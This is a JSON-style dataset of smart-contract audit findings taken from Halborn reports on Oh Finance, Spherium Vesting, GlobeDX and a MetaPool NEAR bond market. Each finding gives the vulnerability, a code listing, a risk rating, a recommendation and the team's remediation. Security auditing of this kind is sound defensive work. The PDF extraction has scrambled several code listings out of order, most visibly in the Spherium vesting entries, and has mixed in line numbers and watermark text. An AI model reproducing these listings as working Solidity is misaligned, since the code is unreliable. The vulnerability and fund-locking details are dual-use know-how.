        "body": "OhBank.sol contract use tx.origin so that defense modifier can be called by anybody. It is recommended that you use msg.sender instead of tx.origin because if a transaction is made to a malicious wallet, when you check it you will have the origin address and you will not be able to know the address of the malicious wallet. Nevertheless, the use of tx.origin is semi-legitimized for recording who calls the contract most. Furthermore, tx.origin could be used to prevent an address from interacting with your contract because the owner of the address cannot use the contract as an intermediary to circumvent your blocking. Finally, it is important to remark that the use of tx.origin will be deprecated. Code Location: OhBank.sol Line #37 Listing 1: OhBank.sol (Lines 38) 37 38 39 40 modifier defense { require ( msg . sender == tx . origin || IManager ( manager () ). whitelisted ( msg . sender ) , \" Bank : Only EOA or whitelisted \" ); _ ; } Risk Level: Likelihood - 3 Impact - 4 13 Recommendation: It is recommended not to use tx.origin because a malicious wallet could receive funds and cannot be tracked. However, its use is semi-legitimate in some cases with caution. Remediation Plan: This modifiers purpose is to prevent smart contracts from interacting with the Bank contract (i.e. malicious attacks). The only time that tx.origin == msg.sender is when the top-level caller is a user, not a contract. The OpenZeppelin implementation of the Address library is not sufficient for identifying whether an address is NOT a contract, therefore this is the only form of logic currently available in Solidity that accurately blocks contract interaction. Contracts are upgradeable and logic can be updated if EIP-3074 is passed and implemented. The issue is reclassified to LOW. 14 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The contracts OhBank.sol has _deposit method and in this method, transferFrom() is being called without any implementing checks on the return value. Several tokens do not revert in case of failure and return false which may allow an attacker to deposit for free. Code Location: Listing 2: OhBank.sol (Lines 225) // deposit underlying to receive shares function _deposit ( uint256 amount , address sender , address recipient ) internal { require ( totalStrategies () > 0, \" Bank : No Strategies \" ); require ( amount > 0, \" Bank : Invalid Deposit \" ); uint256 totalSupply = totalSupply () ; uint256 mintAmount = totalSupply == 0 ? amount : amount . mul ( totalSupply ). div ( virtualBalance () ); _mint ( recipient , mintAmount ); IERC20 ( underlying () ). transferFrom ( sender , address ( this ) , amount ); emit Deposit ( recipient , amount ); } 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 15 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Although using SafeERC20 for IERC20; is used we recommend using safe- TransferFrom() instead of the transferFrom() function. Remediation Plan: Updated SOLVED: SafeERC20. safeTransferFrom method. This method will cause any ERC20 to revert in case of failure. Fixed in coomit ID: d7ef893c0377d347b9730e724d70b5c7e7b6f4a1 OpenZeppelin OhBank.sol use the to 16 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "USE OF BLOCK.TIMESTAMP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During a manual static review, the tester noticed the use of block .timestamp in OhAaveV2Strategy.sol contract. The contract developers should be aware that this does not mean current time. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 3: OhAaveV2Strategy.sol (Lines 92,99) 87 // / @dev Compound stkAAVE rewards on a alternating cooldown 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 schedule function _compound () internal { uint256 currentCooldown = rewardCooldown () ; // if the current cooldown has passed if ( block . timestamp > currentCooldown ) { // save state variables uint256 balance = stakedBalance () ; address staked = stakedToken () ; uint256 expiration = currentCooldown . add ( unstakingWindow ( staked )) ; // if we have stkAAVE and the unstaking window hasn 't passed if ( balance > 0 && block . timestamp < expiration ) { // redeem all available AAVE redeem ( staked , balance ); // validate we received AAVE uint256 amount = rewardBalance () ; if ( amount > 0) { // liquidate for underlying 17 107 108 109 } } liquidate ( reward () , underlying () , amount ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: Use block.number instead of block.timestamp to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: The AaveV2Strategy.sol file only deals with time periods greater than 48 hours. There is a 480 hour waiting period that must first pass to convert stkAAVE into AAVE. Then there is a maximum 48 hour window in which the conversion can take place. Timeframes of this length should not be affected by miner manipulation. 18 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "We observed that some critical functionality are missing emitting any events like exit and exitAll functions, the governance would probably want to monitor these operations Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider emitting an event when calling exit or exitAll function. Listing 4 1 event exit ( address strategy , uint256 amount ); 2 event exitAll ( address strategy ) Remediation Plan: SOLVED: Added event emitters for the recommended exit and exitAll methods. Added additional events where appropriate. Fixed in commit ID: 240 a1a261b7f3a9e11031f7a078557073bc7b07d 19 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdraw function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against reentrancy attacks. Code Location: Listing 5: OhBank.sol (Lines 197) // withdraw an amount of shares for underlying function withdraw ( uint256 shares ) external override defense { _withdraw ( msg . sender , shares ); } 196 197 198 199 200 Listing 6: OhCompoundStrategy.sol (Lines 87) // withdraw all underlying by redeem all cTokens function withdrawAll () external override onlyBank { uint256 invested = investedBalance () ; _withdraw ( msg . sender , invested ); } 86 87 88 89 90 91 Listing 7: OhAaveV2Strategy.sol (Lines 76) 75 76 77 78 // / @notice function withdraw ( uint256 amount ) external override onlyBank returns ( uint256 ) { uint256 withdrawn = _withdraw ( msg . sender , amount ); return withdrawn ; 20 } 79 80 Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the OhBank.sol , OhCompoundStrategy.sol , OhCurve3PoolStrategy.sol and OhAaveV2Strategy.sol contract, function like withdraw() and withdrawAll (), are missing nonReentrant guard. Use the nonReentrant modifier to avoid introducing future vulnerabilities. Remediation Plan: RISK ACCEPTED: Oh!Finance team claims that no changes are necessary. The defense modifier prevents re-entrancy attacks. Since only top-level users can call these functions, it is not possible to execute any code on callbacks. 21 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPRECISION OF A CONSTANT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "During the audit, It has been observed that integers with scientific notations are directly compared with function arguments. Code Location: OhCompoundStrategy.sol Lines #56,100,101 OhCurve3PoolStrategy.sol Lines #120,123,126 Listing 8: OhCurve3PoolStrategy.sol (Lines ) 120 121 122 123 124 125 126 uint256 supplyShare = amount . mul (1 e18 ). div ( invested ); // find amount to unstake in 3 CRV uint256 unstakeAmount = Math . min ( staked , supplyShare . mul ( staked ). div (1 e18 )) ; // find amount to redeem in underlying uint256 redeemAmount = Math . min ( invested , supplyShare . mul ( invested ). div (1 e18 )) ; Recommendation: It is recommended to define precision values as a constant value at the beginning of contract. Listing 9 1 uint constant PRECISION = 1 e18 ; 22 Remediation Plan: ACKNOWLEDGED: Oh!Finance team claims that no changes are necessary. Declaring constant variables in proxy contracts introduces upgrade risks and usage of the memory stack is cheaper than referencing stored vari- ables. 23 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 10: OhBank.sol (Lines 118) 118 119 120 121 122 function virtualPrice () public view override returns ( uint256 ) { uint256 totalSupply = totalSupply () ; uint256 unit = 10** decimals () ; return totalSupply == 0 ? unit : virtualBalance () . mul ( unit ). div ( totalSupply ); } Listing 11: OhAaveV2Strategy.sol (Lines 56) 56 57 58 function investedBalance () public view override returns ( uint256 ) { return derivativeBalance () ; } Risk Level: Likelihood - 1 Impact - 1 24 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: ACKNOWLEDGED: Oh!Finance team claims that functions were intentionally left public. While the Bank and Strategy contracts have upgradeable proxy implementation prevents changing function signatures. logic, Leaving functions marked as public adds the least restrictions for (e.g. We mark virtualPrice() as external and later future upgrades. want to push an upgrade that uses virtualPrice() in a calculation, this cannot be done without duplicating code). 25 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF LIQUIDITY LOSS PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Oh_Finance_Smart_Contract_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The exit and exitAll functions allows the bank owner to transfer the deposited amounts to their account. These situations are often enabled because a single bank role, or a liquidity address has access to remove all the TVL (Total Value Locked) through a withdraw or transfer function. While sometimes, the developer or owner does not intend to do this malicious act, the risk still exists if the private key is stolen since there is nothing preventing the key-holder from calling the withdraw. Code Location: Listing 12: OhBank.sol (Lines ) 120 121 122 123 124 125 126 127 128 129 // / @notice Exit and withdraw a given amount from a strategy // / @param strategy The address of the Strategy to exit function exit ( address strategy , uint256 amount ) external override onlyAuthorized { IStrategy ( strategy ). withdraw ( amount ); } // / @notice Exit and withdraw all underlying from a given strategy function exitAll ( address strategy ) external override onlyAuthorized { IStrategy ( strategy ). withdrawAll () ; } Recommendation: Those functions allows the banks of the system to perform withdraw all amounts from strategy addresses. The bank should be limited to the minimum operations possible that allows pool management. Oh!Finance does only use the onlyBank and onlyAuthorized modifier , the bank role check to perform 26 critical actions such as enabling transfers on the strategies. However, these functionalities should be split between multiple role based users with multi-signature wallets for each one. Also, It is recommended to add timelock or pause/unpause functionality on the withdraw progress. The latency introduced by time locks can act as a preview for how things might work under the unexpected situations. ### Remediation Plan *RISK ACCEPTED* Oh!Finance team claims that no change are necessary. The onlyAuthorized modifier allows either the Manager or Governance address to perform a Strategy exit. Strategy exits do not allow either of these addresses to withdraw user funds, only the withdrawal from a specific Strategy to the Bank address. Funds then sit on the Bank contract and can be withdrawn by burning Bank tokens as usual. The Manager address will always be a contract. During the initial deployment, the Governance address will be set to the deployer, but will then be updated to a DAO These functions were written to facilitate normal Timelock Contract. interactions between the Banks and Strategies, allow any upgrades, and allow any emergency actions to be taken by Governance in the case of an underlying protocol failure. 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can it be called twice in the same block and cause issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation . . .  Are the function parameters and variables controlled by external contracts?  Can we re-initialize contracts?  Can we withdraw more than allowed? G N I T S E T L A U N A M 29 4.1 Testing if contracts could be reinitialized again. Custom tests are useful for developers to check if functions and Furthermore, they are also useful for permissions work correctly. security auditors to perform security tests behaving like a malicious user. Then, auditors manually manipulated inputs to check the security in the smart contracts. Contracts are deployed using a proxy, its essential to test if the initializer modifier exists and prevent deploying the contract again and possibly gain ownership to the contract by attackers. , OhBank.sol s OhCurve3PoolStrategy.sol using OpenZeppelin. Moreover , manually redeploying again will give revert. OhCompoundStrategy.sol initializer OhAaveV2Strategy.sol are modifier , the and from Listing 13: OhBank.sol (Lines 43,59) } assert ( registry () == address (0) ) ; assert ( underlying () == address (0) ) ; 42 // / @notice Initialize the Bank Logic 43 constructor () initializer { 44 45 46 47 48 49 50 51 52 // / @notice Initialize the Bank Proxy // / @param name_ The name of the Bank Token // / @param symbol_ The symbol of the Bank Token // / @param registry_ Rhe address of the registry // / @param underlying_ Rhe address of the underlying token that is deposited // / @dev Should be called when deploying the proxy contract function initializeBank ( string memory name_ , string memory symbol_ , address registry_ , address underlying_ ) public initializer { 53 54 55 56 57 58 59 60 30 G N I T S E T L A U N A M Initialization Check G N I T S E T L A U N A M 31 4.2 Testing For Function Clashing. The DAPP is using proxy to allow quick bug-fixing and adding new features on top of already deployed contracts. its essential to know in such design its possible to conceal malicious code that can be very difficult to spot. Function clashing happens when any function in the Proxy contract whose selector matches with one in the implementation contract will be called directly, completely skipping the implementation code, function selector is the first four bytes of the sha3 of the function signature. therefore we used slither plugin slither-check-upgradeability to ensure that there is no such clashing between the contracts in scope and the proxy contract. Function Clashing Test G N I T S E T L A U N A M 32 4.3 Testing For Roles And Privilege. In this test, it is tried to call critical functions such as exit() and exitAll() to withdraw all funds from strategies. It is observed that access control is correctly implemented and most critical function was either internal or can be only called by Banks or Governors. Exit/ExitAll Function Privilege Check Pause/Unpause Function Privilege Check G N I T S E T L A U N A M 33 Strategy Functions Privilege Check G N I T S E T L A U N A M 34 4.4 Testing For Burning More Tokens Than owned. In this test, it is tried to burn more tokens than a user owned through the withdraw function, there were no checks to ensure the balance of the owner before calling the _burn method, however the _burn will automatically revert if the amount to be burned is more than his balance. we still recommend adding a require statement to ensure the user has enough balance before calling the burn function to optimize gas usage. Withdraw Testing G N I T S E T L A U N A M 35 4.5 Testing Deposit with Signature During the test, depositWithPermit function is evaluated. The signature is created with another address. To sum up, The manipulation was not successful on the contract. Test results can be seen from the below. G N I T S E T L A U N A M 36 ",
        "labels": [
            "Halborn",
            "Oh_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "USAGE OF BLOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: SphrVestingStatic.sol During a manual review, usage of block.timestamp in SphrVestingStatic. sol and SphrVesting.sol were observed. The contract developers should now is an alias for be aware that this does not mean current time. block.timestamp. The value of block.timestamp can be influenced by miners to a certain degree, so the testers should be warned that this may have some risk if miners collude on time manipulation to influence the price oracles. Miners can influence the timestamp by a tolerance of 900 seconds. D R A F T } vestedAmount_ = vestedAmount_ . sub ( _releaseAmount [ msg . uint256 vestedAmount_ ; for ( uint256 i =0; i < vestingSchedules_ . length ; i ++) { function vestedAmount () public view virtual returns ( uint256 ) { if ( vestingSchedules_ [ i ]. schedule < block . timestamp ) { Listing 2: SphrVestingStatic.sol (Lines 45) vestedAmount_ = vestingSchedules_ [i ]. amount . add ( VestingSchedule [] memory vestingSchedules_ = _vestingSchedules [ msg . sender ]; return vestedAmount_ ; vestedAmount_ ); sender ]) ; 40 41 42 43 44 45 46 47 48 49 50 51 52 } } SphrVestingStatic.sol 12 Listing 3: SphrVestingStatic.sol (Lines 59) function claim () public returns ( bool ) { VestingSchedule [] memory vestingSchedules_ = _vestingSchedules [ msg . sender ]; if ( vestingSchedules_ [ i ]. schedule < block . timestamp ) { _releaseAmount [ msg . sender ]. } sender ]) ; return true ; vestedAmount_ ); add ( vestedAmount_ ); delete vestingSchedules_ [i ]; amount must be greater then 0 \" ); vestedAmount_ = vestingSchedules_ [i ]. amount . add ( require ( vestedAmount_ > 0, \" SphrVestingStatic : vested _token . safeTransfer ( msg . sender , vestedAmount_ ); _releaseAmount [ msg . sender ] = uint256 vestedAmount_ ; for ( uint256 i =0; i < vestingSchedules_ . length ; i ++) { } vestedAmount_ = vestedAmount_ . sub ( _releaseAmount [ msg . D R A F T // uint256 totalBalance = currentBalance . add ( _released [ } else if ( block . timestamp >= _start . add ( _duration )) { if ( block . timestamp < _cliff ) { return _share [ msg . sender ]; address ( token ) ]) ; return 0; ) ; // uint256 currentBalance = _token . balanceOf ( address ( this ) } else { Listing 4: SphrVesting.sol (Lines 90,92) function _vestedAmount () private view returns ( uint256 ) { } SphrVesting.sol 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 86 87 88 89 90 91 92 93 94 95 96 97 return _share [ msg . sender ]. mul ( block . timestamp . sub ( _start )) . div ( _duration ); } } 13 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Remediation Plan: RISK ACCEPTED: Spherium team accepts this risk. Use block.number instead of block.timestamp or now to reduce the risk of MEV attacks. Check if the timescale of the project occurs across years, days and months rather than seconds. If possible, it is recommended to use Oracles. D R A F T 14 ",
        "labels": [
            "Halborn",
            "Spherium_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: Listing 5: (Lines 1) 1 pragma solidity ^0.6.12; 2 } Vesting interfaces contract ISph.sol and ITimelock.sol uses the floating pragma 0.6.12. Contract should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too new which has not been extensively tested. D R A F T Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. Likelihood - 1 Impact - 3 Recommendations: Risk Level: 15 Remediation Plan: SOLVED: c2394c97f6a29858bebf316663cf393f9400593b. Spherium team locked the pragma version in commit D R A F T 16 ",
        "labels": [
            "Halborn",
            "Spherium_Vesting",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENTS EMITTING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: Listing 6: Missing Events It has been observed that important functionality is missing emitting event for some functions on the SphrVestingStatic.sol contract. These functions should emit events. 1 function claim () public returns ( bool ) 2 function vestedAmount () public view virtual returns ( uint256 ) 3 function addVestingSchedule ( address benificiary , uint256 amount , uint256 schedule ) public onlyOwner returns ( bool ) D R A F T 4 Risk Level: Likelihood - 1 Impact - 2 Recommendations: Remediation Plan: Consider emitting an event when calling related functions on the list above. ACKNOWLEDGED: Spherium team acknowledges this issue. 17 ",
        "labels": [
            "Halborn",
            "Spherium_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Vesting_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Code Location: In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Also, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. D R A F T SphrVestingStatic: tokenContract, addVestingSchedule, vestedAmount, claim, getBlockTimes- tamp SphrVesting: getReleased, getShare, getBlockTimestamp, release Below are smart contracts and their corresponding functions affected: Likelihood - 1 Impact - 1 Risk Level: Recommendation: Consider as much as possible declaring external variables instead of public variables. As for best practice, you should use external if you 18 expect that the function will only be called externally and use public if you need to call the function internally. To sum up, all can access to public functions, external functions only can be accessed externally and internal functions can only be called within the contract. Remediation Plan: ACKNOWLEDGED: Spherium team acknowledges this issue. D R A F T 19 ",
        "labels": [
            "Halborn",
            "Spherium_Vesting",
            "Severity: Informational"
        ]
    },
    {
        "title": "IMPROPER ACCESS CONTROL POLICY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "Implementing a valid access control policy is an essential step in main- taining the security of a smart-contract. All the features of the smart contract , such as add/remove roles and upgrade contracts are given by Access Control. For instance, Ownership is the most common form of Ac- cess Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Addi- tional authorization levels are needed to implement the least privilege principle, also known as least-authority, which ensures only authorized processes, users, or programs can access the necessary resources or in- formation. The ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. In the GDT.sol contract, there is no authorization check on the burn function. Each user can burn their own balance on the related function. Code Location: GDT.sol Lines #56-66 GDT.sol Lines #56-66 13 Figure 1: Any user can burn their own balance. Risk Level: Likelihood - 4 Impact - 4 Recommendation: Its recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different role. In the other words, A white-listing should be applied on the burn function via access control policy. The access control policy of function may govern who can burn their balances. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: Solved: GlobeDX team included the initial address check in the function. 14 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: High"
        ]
    },
    {
        "title": "LACK OF OVERFLOW PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "In the GDT.sol functions, The contract does not perform any precondition checks on the function arguments. Code Location: GDT.sol Lines #20-27 GDT.sol Lines #42-54 GDT.sol Lines #56-66 15 GDT.sol Lines #68-77 GDT.sol Lines #79-87 Risk Level: Likelihood - 3 Impact - 3 Recommendation: A contract should consider using the OpenZeppelin SafeMath library on the decimal calculations and should perform a precondition check to prevent an overflow. Reference: https://docs.openzeppelin.com/contracts/2.x/api/math Remediation Plan: Solved: GlobeDX team will use pragma version 0.8.4. 16 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF ADDRESS CONTROL ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "Address validation in contract GDT.sol is missing. validation has been found in the multiple functions. Lack of address Code Location: GDT.sol Lines #14-18 GDT.sol Lines #20-27 GDT.sol Lines #35-42 17 GDT.sol Lines #42-54 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add proper address validation when assigning a value to a variable from user supplied inputs. As a better solution, a white-listing/black-listing should be applied on the related functions. Listing 1 1 2 3 4 5 6 modifier validAddress ( address addr ) { require ( addr != 0 , \" Value can not be null \") ; require ( addr != address (0) , \" Address cannot be 0 x0 \") ; require ( addr != address ( this ) , \" Address cannot be contract address \") ; _; } Remediation Plan: Solved: GlobeDX team completed address check on the related functions. 18 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Low"
        ]
    },
    {
        "title": "OUTDATED OPENZEPPELIN CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "The GDT contract used outdated version of the OpenZeppelin contract and was written for Solidity 0.4.21. Even though this outdated version does not pose any high-risk vulnerabilities, some of function implementations have since changed, which may lead to GlobeDX being incompatible. GDT.sol Lines #68-88 https://github.com/OpenZeppelin/openzeppelin-contracts/ Reference: issues/437 Reference: https://ethereum.org/tr/developers/tutorials/erc20-annotated-code/ Risk Level: Likelihood - 1 Impact - 1 19 Recommendation: The OpenZeppelin contract should be updated to latest stable version for being compatible with modern ERC-20 tokens. Remediation Plan: Risk Accepted: the GlobeDX team has decided to use the older version of ERC20 token. 20 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRAGMA VERSION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "GDT.sol uses one of the latest pragma version (0.8.3) which was released on March 23, 2021. The latest pragma version (0.8.4) was released in April 2021. Many pragma versions have been lately released, going from version 0.6.x to the recently released version 0.8.x. in a short time. Code Location: GDT.sol Line #~1 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider if possible, using a stable pragma version (0.6.12-0.7.3) that has been well tested to prevent potential undiscovered vulnerabilities. Reference: https://github.com/ethereum/solidity/blob/develop/docs/bugs_ by_version.json 21 Remediation Plan: Risk Accepted: GlobeDX team considers the use of pragma 0.8.4 appropriate for the deployment to the mainnet. 22 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading call- data is cheaper than memory allocation. Public functions need to write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 2 1 function transfer 2 function transferFrom 3 function burn 4 function increaseAllowance 5 function decreaseAllowance Risk Level: Likelihood - 1 Impact - 1 Recommendation: A Consider declaring external variables instead of public variables. best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. 23 Remediation Plan: Solved: GlobeDX team marked functions as an external. 24 ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Informational"
        ]
    },
    {
        "title": "NO TEST COVERAGE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/GlobeDX_Smart_Contract_Audit_Halborn_v1_1.pdf",
        "body": "Unlike other software programs, smart contracts can not be modified or removed if deployed once into a specific address except if you deploy them with a proxy contract. Checking the code by automated testing (unit testing or functional testing) is a good practice to be sure all lines of the code work correctly. Mocha and Chai are useful tools to perform unit test in Smart Contracts functions. Mocha is a Javascript testing framework for creating both synchronous and asynchronous unit tests. Moreover, Chai is an assertions library with some interfaces such as assert, expect and should to develop custom unit tests. References: https://github.com/mochajs/mocha https://github.com/chaijs/chai https://docs.openzeppelin.com/learn/writing-automated-tests Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended considering to perform as much as possible test cases to cover all possible scenarios in the smart contract. 25 Remediation Plan: Solved: GlobeDX team implemented test cases via another framework. 26 3.8 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "GlobeDX",
            "Severity: Informational"
        ]
    },
    {
        "title": "FUNDS LOCKING DUE TO UNAUTHORIZED BOND MERGING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Katherine_Fundraising_and_Bond_Market_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final .pdf",
        "body": "During our analysis, we identified an issue concerning the merge_bonds function within the system. This function currently lacks any form of authorization, which leaves it open to manipulation by any user, including those with malicious intent. This absence of secure access control allows users to merge any valid bonds, despite the possible implications to the systems stability and security. One such implication is the potential for funds to be indefinitely locked within the BondMarket contract. This problematic scenario occurs when a bond, which is listed for auction sale within the BondMarket contract, is successfully auctioned off. In this case, the winning bidder should ideally be able to claim ownership of the bond via the pull_sale_bond function, which transfers ownership through a cross-contract call to the BondOperator contract. However, should this cross-contract call fail for any reason, the system reverts to a state where the winning bidder is still recognized as the auction winner through the process_auction_ends_callback function. This state of affairs leads to the funds remaining inaccessible for withdrawal as long as the system perceives that user as the auction winner. The unrestricted access to the merge_bonds function adds another layer of complexity to this issue. A malicious user could manipulate this function, merging a bond currently on sale into another bond, effectively erasing the original bonds identifier data. The deletion of this crucial data in turn results in the persistent failure of the cross-contract call initiated by the pull_sale_bond function. This vulnerability effectively causes the funds committed by the win- ning bidder to be indefinitely locked within the BondMarket contract. 21 Moreover, it obstructs the proper transfer of bond ownership, creating potential liabilities and hindering the smooth operation of the system. Code Location: Down below is a code snippet from the merge_bonds function: Listing 1: contracts/bond-operator-contract/src/lib.rs let bond = self . internal_get_bond ( bond_id ); let mut other = self . internal_get_bond ( other_id ); let new_bond = bond . merge (& mut other ); 371 pub fn merge_bonds (& mut self , bond_id : BondId , other_id : BondId ) { 372 373 374 375 376 377 378 379 380 381 } // Replace with merged bond . self . bonds . insert (& bond_id , & new_bond ); // Remove other bond . self . internal_bond_drop (& other ); BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:H/Y:N/R:N/S:C (9.4) Proof Of Concept: Listing 2: src/halborn_testcases/test_merge_bond_on_sale.rs let worker = workspaces :: sandbox () . await ?; let root_account = worker . root_account () ?; 142 #[ tokio :: test ] 143 async fn test_merge_bond_on_sale () -> anyhow :: Result <() > { 144 145 146 147 148 149 150 151 152 . create_subaccount (\" halborn \") . initial_balance (199999999999999900000000000) . transact () . await ? let halborn_account = root_account 22 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 